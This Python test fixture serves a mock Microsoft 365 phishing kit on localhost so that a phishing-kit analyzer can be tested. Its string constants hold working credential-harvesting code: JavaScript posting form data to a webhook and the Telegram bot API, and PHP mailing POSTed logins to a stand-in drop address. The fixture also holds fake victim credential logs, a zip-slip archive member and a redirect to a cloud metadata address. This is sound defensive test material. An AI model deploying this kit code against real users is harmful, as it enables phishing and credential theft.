"""Harmless local mock phishing kit used by the Phase 5 tests.

Everything here is static fixture data served from ``127.0.0.1`` on an ephemeral
port. There is no real credential capture, no outbound traffic and no code
execution: the "exfiltration" endpoints are just strings that a real kit would
POST to. The fixture exists so the analyzer can be tested against a realistic
page shape without ever contacting hostile infrastructure.
"""

from __future__ import annotations

import io
import threading
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TELEGRAM_TOKEN = "123456789:AAHmockTokenValueForTestsOnly_1234567890"
TELEGRAM_BOT_ID = "123456789"
TELEGRAM_CHAT_ID = "-1001234567890"
EXFIL_EMAIL = "drop@evil-c2.example"
ARCHIVE_EMAIL = "archive-drop@evil-c2.example"
SECOND_EXFIL_EMAIL = "mule@fraud-mail.example"

KIT_HTML = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="description" content="Sign in to your Microsoft 365 account">
  <title>Microsoft 365 - Sign in to your account</title>
  <link rel="stylesheet" href="/assets/style.css">
  <script src="/assets/app.js"></script>
  <script src="https://cdn.example.org/tracker.js"></script>
</head>
<body>
<!-- kit author: @kitbuilder | support: @kit_support -->
<div class="brand">Microsoft</div>
<h1>Sign in to continue to Office 365</h1>
<form action="/post.php" method="post">
  <input name="email" type="email" placeholder="someone@example.com">
  <input name="password" type="password" placeholder="Password">
  <input name="otp" type="text" placeholder="Verification code">
  <button type="submit">Sign in</button>
</form>
<iframe src="/frame"></iframe>
<a href="/kit.zip">Download kit</a>
<script>
  var _t = "{TELEGRAM_TOKEN}";
  fetch("https://api.telegram.org/bot" + _t + "/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text=x");
  var drop = "{EXFIL_EMAIL}";
  gtag('config', 'G-ABCDEFGHIJ');
  ga('create', 'UA-123456-7', 'auto');
  fbq('init', '123456789012345');
  ym(12345678);
</script>
</body>
</html>
"""

APP_JS = f"""
const HOOK = "https://webhook.site/abc-123-def";
const TG = "{TELEGRAM_TOKEN}";
const TG_API = "https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage";
function send(data) {{
  fetch(HOOK, {{method: "POST", body: JSON.stringify(data)}});
  fetch("https://api.telegram.org/bot" + TG + "/sendMessage", {{
    method: "POST", body: "chat_id={TELEGRAM_CHAT_ID}&text=" + JSON.stringify(data)
  }});
}}
document.querySelector("form").addEventListener("submit", function (event) {{
  event.preventDefault();
  send({{email: document.querySelector("[name=email]").value}});
}});
"""

STYLE_CSS = """
body { font-family: 'Segoe UI', sans-serif; background: #f3f3f3; }
.brand { color: #0078d4; font-weight: 600; }
form { max-width: 360px; margin: 4rem auto; }
"""

CONFIG_PHP = f"""<?php
// kit configuration - served as source by a misconfigured server
$mail_to = "{ARCHIVE_EMAIL}";
$log_path = "logs/results.txt";
$telegram = "{TELEGRAM_TOKEN}";
$api = "https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage";
if ($_POST) {{
    mail($mail_to, "new login", json_encode($_POST));
    file_put_contents($log_path, $_POST["email"] . ":" . $_POST["password"] . "\\n", FILE_APPEND);
}}
?>
"""

LOG_TEXT = (
    "victim1@gmail.com:Passw0rd!2026\n"
    "victim2@yahoo.com:hunter2\n"
    "victim3@outlook.com:Summer2026!\n"
    "otp=448812\n"
)

RESULTS_CSV = (
    "email,password,ip\n"
    "victim4@gmail.com,Winter2025!,203.0.113.9\n"
    "victim5@proton.me,qwerty123,198.51.100.7\n"
)

CHALLENGE_HTML = """<!doctype html><html><head><title>Just a moment...</title></head>
<body><h1>Just a moment...</h1><div id="challenge-platform"></div></body></html>"""

FINAL_HTML = """<!doctype html><html><head><title>Final lure</title></head>
<body><p>Thank you, your account is being verified.</p></body></html>"""

FRAME_HTML = """<!doctype html><html><body><p>embedded frame</p></body></html>"""

# 1x1 transparent PNG.
PNG_BYTES = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
    "890000000a49444154789c6360000002000154a24f5f0000000049454e44ae426082"
)


def build_kit_zip() -> bytes:
    """A small ZIP with one safe member, one source file and one slip member."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("index.html", KIT_HTML.replace(EXFIL_EMAIL, ARCHIVE_EMAIL))
        archive.writestr("config.php", CONFIG_PHP)
        archive.writestr("readme.txt", "kit v2 - do not distribute")
        archive.writestr("../../evil.php", "<?php echo 'escape'; ?>")
    return buffer.getvalue()


class _KitHandler(BaseHTTPRequestHandler):
    server_version = "MockKit/1.0"
    sys_version = ""
    records: list[dict] = []

    def log_message(self, *args) -> None:  # keep test output clean
        pass

    # -- helpers ------------------------------------------------------------
    def _send(
        self,
        status: int,
        body: str | bytes,
        content_type: str = "text/html; charset=utf-8",
        headers: dict | None = None,
    ) -> None:
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        for key, value in (headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(data)

    # -- routing ------------------------------------------------------------
    def do_GET(self) -> None:  # noqa: N802 - stdlib naming
        type(self).records.append({
            "path": self.path,
            "cookie": self.headers.get("Cookie"),
            "user_agent": self.headers.get("User-Agent"),
            "host": self.headers.get("Host"),
        })
        path = self.path.split("?", 1)[0]

        if path == "/":
            self._send(200, KIT_HTML, headers={"Set-Cookie": "kit_session=leaked; Path=/"})
        elif path == "/assets/app.js":
            self._send(200, APP_JS, "application/javascript; charset=utf-8")
        elif path == "/assets/style.css":
            self._send(200, STYLE_CSS, "text/css; charset=utf-8")
        elif path == "/assets/logo.png":
            self._send(200, PNG_BYTES, "image/png")
        elif path == "/config.php":
            self._send(200, CONFIG_PHP, "text/plain; charset=utf-8")
        elif path in ("/logs", "/logs/"):
            self._send(200, LOG_TEXT, "text/plain; charset=utf-8")
        elif path == "/results":
            self._send(200, RESULTS_CSV, "text/csv; charset=utf-8")
        elif path == "/admin":
            self._send(403, CHALLENGE_HTML, headers={"Server": "cloudflare"})
        elif path == "/go":
            self._send(302, "", headers={"Location": "/final"})
        elif path == "/final":
            self._send(200, FINAL_HTML)
        elif path == "/private-redirect":
            self._send(302, "", headers={"Location": "http://169.254.169.254/latest/meta-data/"})
        elif path == "/big":
            self._send(200, "A" * 200_000, "text/plain; charset=utf-8")
        elif path == "/kit.zip":
            self._send(200, build_kit_zip(), "application/zip")
        elif path == "/frame":
            self._send(200, FRAME_HTML)
        else:
            self._send(404, "not found", "text/plain; charset=utf-8")


class KitFixtureServer:
    """Context manager that serves the mock kit on an ephemeral loopback port."""

    def __init__(self) -> None:
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), _KitHandler)
        self.httpd.daemon_threads = True
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.records = []
        _KitHandler.records = self.records

    @property
    def port(self) -> int:
        return int(self.httpd.server_address[1])

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    def paths(self) -> list[str]:
        return [record["path"] for record in self.records]

    def record_for(self, path: str) -> dict | None:
        for record in self.records:
            if record["path"] == path:
                return record
        return None

    def __enter__(self) -> "KitFixtureServer":
        self.thread.start()
        return self

    def __exit__(self, *exc_info) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()
        self.thread.join(timeout=5)
